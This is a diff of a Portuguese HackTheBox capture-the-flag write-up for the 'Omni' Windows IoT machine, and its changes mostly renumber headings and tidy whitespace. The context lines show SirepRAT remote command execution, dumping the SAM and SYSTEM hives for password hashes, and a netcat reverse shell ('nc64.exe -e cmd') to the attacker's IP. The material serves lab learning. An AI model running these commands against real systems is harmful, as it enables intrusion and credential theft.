@@ -1,28 +1,29 @@
-1. [Resolução da máquina **OMNI**](#resolução-da-máquina-omni) 1. [Máquina Fácil (hackthebox.com)](#máquina-fácil-hacktheboxcom) 2. [by **_JavaliMZ_** - 08/09/2021](#by-javalimz---08092021)
-2. [Enumeração](#enumeração)
-    1. [Nmap](#nmap)
-3. [Exploração](#exploração)
-4. [Escalada de privilégios](#escalada-de-privilégios)
-    1. [Enumeração do sistema](#enumeração-do-sistema)
-    2. [User "app"](#user-app)
-
 ![](Assets/HTB-Windows-Easy-omni/icon.webp)
 
 <img src="https://img.shields.io/badge/OMNI-HackTheBox-green?style=plastic" width="200">
 
-# Resolução da máquina **OMNI**
+<h1> Resolução da máquina <b>OMNI</b></h1>
 
-#### Máquina Fácil (hackthebox.com)
+<h4> Máquina Fácil (hackthebox.com)</h4>
 
-#### by **_JavaliMZ_** - 08/09/2021
-
----
+<h4> by <b><i>JavaliMZ</i></b> - 08/09/2021</h4>
 
 ---
 
-# Enumeração
+---
 
-## Nmap
+- [1. Enumeração](#1-enumeração)
+  - [1.1. Nmap](#11-nmap)
+- [2. Exploração](#2-exploração)
+- [3. Escalada de privilégios](#3-escalada-de-privilégios)
+  - [3.1. Enumeração do sistema](#31-enumeração-do-sistema)
+  - [3.2. User "app"](#32-user-app)
+
+---
+
+# 1. Enumeração
+
+## 1.1. Nmap
 
 A primeira ferramenta que sempre uso para enumerar qualquer máquina é o nmap. Essa ferramenta permite-nos enumerar as portas abertas de um dado IP, e versões e potenciais vulnerabilidades de softwares que estão correndo em cada porta.
 
@@ -42,7 +43,7 @@ Depois de alguma pesquisa, se pesquisar-mos por _"Windows Device Portal exploit 
 
 ![Windows IoT Core](Assets/HTB-Windows-Easy-omni/win_IoT_Core.jpg)
 
-# Exploração
+# 2. Exploração
 
 ```bash
 git clone https://github.com/SafeBreach-Labs/SirepRAT.git
@@ -91,9 +92,9 @@ python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "
 
 ![ipconfig](Assets/HTB-Windows-Easy-omni/ipconfig.png)
 
-# Escalada de privilégios
+# 3. Escalada de privilégios
 
-## Enumeração do sistema
+## 3.1. Enumeração do sistema
 
 Para todos os CaptureTheFlag, o objectivo é conseguir ler a _flag_ (user.txt e root.txt)
 
@@ -107,12 +108,12 @@ dir /r /s root.txt  # root.txt : C:\Data\Users\administrator
 
 # Ver quem tem que privilégios nesses ficheiros
 icacls C:\Data\Users\app\user.txt  # NT AUTHORITY\SYSTEM:(I)(F)
-								   # BUILTIN\Administrators:(I)(F)
-								   # OMNI\app:(I)(F)
+                                   # BUILTIN\Administrators:(I)(F)
+                                   # OMNI\app:(I)(F)
 
 icacls C:\Data\Users\administrator\root.txt  # NT AUTHORITY\SYSTEM:(I)(F)
-											 # BUILTIN\Administrators:(I)(F)
-											 # OMNI\Administrator:(I)(F)
+                                             # BUILTIN\Administrators:(I)(F)
+                                             # OMNI\Administrator:(I)(F)
 ```
 
 O proximo passo é migrar de usuários. Neste momento nós estamos com um usuário do Windows Device Portal, e não como usuário da máquina alvo. Esse tipo de usuário pode executar alguns comando no sistema mas tem um poder muito maior. Tem privilégios para verificar a memória RAM do sistema. Isso significa que podemos extrair o HKLM\System e o HKLM\Sam para recuperar informações dos usuários locais (uid:rid:lmhash:nthash)
@@ -172,7 +173,7 @@ copy \\10.10.14.16\smbFolder\nc64.exe C:\Windows\System32\spool\drivers\color\nc
 C:\Windows\System32\spool\drivers\color\nc64.exe -e cmd 10.10.14.16 443
 ```
 
-## User "app"
+## 3.2. User "app"
 
 Na pasta raiz do usuário "app", podemos ver a flag user.txt, mas também vemos um outro ficheiro estranho: iot-admin.xml. O ficheiro contém o seguinte:
 
